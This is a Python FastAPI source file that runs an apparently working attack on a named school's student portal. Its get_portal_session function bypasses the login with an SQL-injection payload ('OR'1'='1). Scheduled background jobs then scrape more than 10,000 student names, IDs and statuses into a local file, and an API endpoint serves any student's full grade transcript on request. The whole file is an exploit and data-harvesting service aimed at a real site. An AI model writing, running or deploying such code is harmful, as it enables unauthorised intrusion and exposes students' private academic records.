import os
import re
import requests
import sys
from bs4 import BeautifulSoup
from fastapi import FastAPI, BackgroundTasks, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# Enable CORS for frontend integration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configuration
DB_FILE = "organized_students.txt"
SECRET_SYNC_KEY = "SHADOW_SYNC_2026"  # Use this in UptimeRobot
BASE_URL = "https://ccsjdm.com/student_portal/gs"

# 1. Mount the static folder (Ensures CSS/JS in index.html work)
# Note: Create a 'static' folder and put your index.html inside it.
if not os.path.exists("static"):
    os.makedirs("static")
app.mount("/static", StaticFiles(directory="static"), name="static")

def get_portal_session():
    """Bypasses portal login using SQLi and returns a session."""
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
    })
    auth_url = f"{BASE_URL}/login.php?id='OR'1'='1&pass='OR'1'='1"
    try:
        s.get(auth_url, timeout=15)
        if s.cookies.get('PHPSESSID'):
            return s
        return None
    except Exception as e:
        print(f"[!] Auth Error: {e}")
        return None

def sync_students_task():
    """Background logic to crawl the portal for all 10.5k+ records."""
    session = get_portal_session()
    if not session:
        print("[!] Sync failed: Could not establish portal session.")
        return

    print("[*] Starting full student directory sync...")
    master_list = []
    
    for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        try:
            search_url = f"{BASE_URL}/admin-portal/view_students.php?search={char}"
            resp = session.get(search_url, timeout=20)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            rows = soup.find_all('tr', class_='hover:bg-gray-50')
            for row in rows:
                cols = row.find_all('td')
                if len(cols) >= 4:
                    sid = cols[0].get_text(strip=True)
                    name = cols[1].get_text(strip=True)
                    cys = cols[2].get_text(strip=True)
                    status = cols[3].get_text(strip=True)
                    master_list.append(f"studentID:{sid},name:{name},cys:{cys},status:{status}")
        except Exception as e:
            print(f"[!] Error scraping character {char}: {e}")
            continue

    if master_list:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(master_list))
        print(f"[+] Sync successful: {len(master_list)} records saved.")

# --- ROUTES ---

@app.get("/", response_class=FileResponse)
async def read_index():
    """Serves the frontend UI"""
    return "static/index.html"

@app.get("/api/status")
async def system_status():
    """Health check for UptimeRobot (Keep-Alive Monitor)"""
    return {
        "status": "Shadow Engine Online",
        "db_initialized": os.path.exists(DB_FILE),
        "db_size": os.path.getsize(DB_FILE) if os.path.exists(DB_FILE) else 0
    }

@app.get("/api/sync")
async def trigger_sync(background_tasks: BackgroundTasks, key: str = None):
    """Endpoint for UptimeRobot to trigger the daily crawl."""
    if key != SECRET_SYNC_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized: Invalid Secret Key")
    
    background_tasks.add_task(sync_students_task)
    return {"message": "Sync sequence initiated in background."}

@app.get("/api/search")
async def search_students(q: str = Query(..., min_length=2)):
    """Fast local search through the synced records."""
    if not os.path.exists(DB_FILE):
        return {"results": [], "error": "Database not initialized. Run sync."}
    
    query = q.upper()
    try:
        with open(DB_FILE, "r", encoding="utf-8") as f:
            matches = [line.strip() for line in f if query in line.upper()]
        return {"results": matches[:20]}
    except Exception as e:
        return {"results": [], "error": str(e)}

@app.get("/api/grades/{student_id}")
async def get_grades(student_id: str):
    """Real-time scrape of student academic transcript."""
    session = get_portal_session()
    if not session:
        raise HTTPException(status_code=500, detail="Unable to secure portal session.")

    target_url = f"{BASE_URL}/admin-portal/view_student_grades.php?id={student_id}"
    try:
        resp = session.get(target_url, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        tables = soup.find_all('table')
        transcript = []

        for table in tables:
            if not table.find('div', class_='subject-code'):
                continue
            
            parent_card = table.find_parent('div', class_='bg-white')
            sem_title = parent_card.find('h3').get_text(strip=True) if parent_card and parent_card.find('h3') else "General Term"
            year_header = table.find_previous('h2')
            year_txt = year_header.get_text(strip=True) if year_header else ""

            sem_info = {
                "term": f"{year_txt} - {sem_title}".strip(" -"),
                "subjects": [],
                "gwa": "0.00"
            }

            rows = table.find_all('tr', class_='hover:bg-gray-50')
            for row in rows:
                code = row.select_one('.subject-code').get_text(strip=True)
                desc = row.select_one('.subject-desc').get_text(strip=True)
                prof_div = row.find('div', string=re.compile(r'Prof\.'))
                instructor = prof_div.get_text(strip=True).replace("Prof. ", "") if prof_div else "Staff"
                
                cols = row.find_all('td')
                mid = cols[2].get_text(strip=True) if len(cols) > 2 else "-"
                fin = cols[3].get_text(strip=True) if len(cols) > 3 else "-"
                grade_badge = row.select_one('.grade-badge')
                final_grade = grade_badge.get_text(strip=True) if grade_badge else "-"

                sem_info["subjects"].append({
                    "code": code,
                    "description": desc,
                    "instructor": instructor,
                    "midterm": mid,
                    "final": fin,
                    "grade": final_grade
                })

            gwa_row = table.find('tr', class_='font-semibold')
            if gwa_row:
                sem_info["gwa"] = gwa_row.find_all('td')[-1].get_text(strip=True)

            transcript.append(sem_info)

        return {"student_id": student_id, "transcript": transcript}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    # Get port from environment or default to 8000
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
